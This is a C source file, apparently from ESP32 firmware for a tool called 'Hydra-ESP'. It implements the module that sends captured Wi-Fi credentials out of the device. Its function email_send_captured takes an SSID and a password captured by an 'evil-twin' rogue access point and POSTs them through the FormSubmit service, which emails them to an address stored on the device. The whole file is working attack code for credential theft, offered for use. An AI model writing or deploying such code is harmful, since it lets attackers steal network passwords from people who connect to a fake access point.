#include "email_sender.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "esp_log.h"
#include "esp_http_client.h"
#include "esp_tls.h"
#include "esp_crt_bundle.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "email_sender";

bool email_is_configured(void){
    nvs_handle_t nvs;
    char email[128]={0};
    size_t len=sizeof(email);
    if(nvs_open("storage", NVS_READONLY, &nvs)==ESP_OK){
        esp_err_t err = nvs_get_str(nvs, "email_to", email, &len);
        nvs_close(nvs);
        return err==ESP_OK && strlen(email)>3 && strchr(email,'@');
    }
    return false;
}

static esp_err_t http_event_handler(esp_http_client_event_t *evt){
    return ESP_OK;
}

void email_send_captured(const char *ssid, const char *password, const char *source){
    if(!email_is_configured()){
        ESP_LOGI(TAG, "Email not configured, skipping");
        return;
    }
    nvs_handle_t nvs;
    char email_to[128]={0};
    size_t len=sizeof(email_to);
    if(nvs_open("storage", NVS_READONLY, &nvs)!=ESP_OK) return;
    if(nvs_get_str(nvs, "email_to", email_to, &len)!=ESP_OK){
        nvs_close(nvs); return;
    }
    nvs_close(nvs);

    // Use FormSubmit AJAX endpoint - no API key needed, just email confirmation once
    // POST to https://formsubmit.co/ajax/<email>
    char url[256];
    snprintf(url, sizeof(url), "https://formsubmit.co/ajax/%s", email_to);

    char subject[128];
    snprintf(subject, sizeof(subject), "Hydra-ESP captured %s", source ? source : "password");

    char message[512];
    snprintf(message, sizeof(message), "SSID: %s\nPassword: %s\nSource: %s\nDevice: Hydra-ESP (luffydnika)", ssid?ssid:"unknown", password?password:"unknown", source?source:"evil-twin");

    // FormSubmit expects form fields: name, email, message etc.
    // We'll send JSON with message
    char post_data[768];
    snprintf(post_data, sizeof(post_data), "{\"name\":\"Hydra-ESP\",\"message\":\"%s\",\"_subject\":\"%s\",\"_captcha\":\"false\"}", message, subject);

    esp_http_client_config_t config = {
        .url = url,
        .event_handler = http_event_handler,
        .method = HTTP_METHOD_POST,
        .timeout_ms = 10000,
        .crt_bundle_attach = esp_crt_bundle_attach,
        .is_async = false,
        .keep_alive_enable = false,
    };
    esp_http_client_handle_t client = esp_http_client_init(&config);
    esp_http_client_set_header(client, "Content-Type", "application/json");
    esp_http_client_set_header(client, "Accept", "application/json");
    esp_http_client_set_post_field(client, post_data, strlen(post_data));

    esp_err_t err = esp_http_client_perform(client);
    if(err==ESP_OK){
        int status = esp_http_client_get_status_code(client);
        int content_len = esp_http_client_get_content_length(client);
        ESP_LOGI(TAG, "Email POST to %s status=%d len=%d", email_to, status, content_len);
        if(status==200){
            ESP_LOGI(TAG, "Email sent successfully to %s", email_to);
        } else {
            ESP_LOGW(TAG, "Email service returned %d, check inbox confirmation for FormSubmit", status);
        }
    } else {
        ESP_LOGE(TAG, "Email POST failed %s", esp_err_to_name(err));
    }
    esp_http_client_cleanup(client);
}
